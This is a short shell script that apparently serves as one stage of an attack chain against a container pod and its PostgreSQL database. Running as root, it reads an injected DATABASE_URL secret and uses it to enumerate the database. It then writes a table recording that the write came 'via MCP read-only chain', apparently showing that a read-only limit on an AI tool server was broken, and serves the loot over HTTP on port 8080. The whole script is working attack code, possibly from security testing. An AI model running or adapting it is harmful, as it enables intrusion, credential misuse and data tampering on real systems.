#!/bin/sh
# S14 ULTIMATE v2: pod root -> psql via injected DATABASE_URL (full URI)
{
  echo "=== POD ==="
  id; hostname
  echo "=== PG CONNECT (injected DATABASE_URL) ==="
  if [ -n "$DATABASE_URL" ]; then
    echo "url host: $(echo "$DATABASE_URL" | cut -d@ -f2 | cut -d/ -f1)"
    timeout 20 psql "$DATABASE_URL" -c "SELECT current_user;" -c "SELECT version();" -c "SELECT count(*) AS public_tables FROM information_schema.tables WHERE table_schema='public';" 2>&1 | head -30
    echo "=== WRITE TEST (create table via pod) ==="
    timeout 20 psql "$DATABASE_URL" -c "CREATE TABLE IF NOT EXISTS mcp_rce_pod (note text, ts timestamptz);" -c "INSERT INTO mcp_rce_pod VALUES ('pod root wrote via MCP read-only chain', now());" 2>&1 | head -10
  else
    echo "NO DATABASE_URL"
  fi
} > /app/chain4.txt 2>&1
printf 'CHAIN4 host=%s uid=%s\n' "$(hostname)" "$(id -u)" > /app/index.html
exec python3 -m http.server 8080
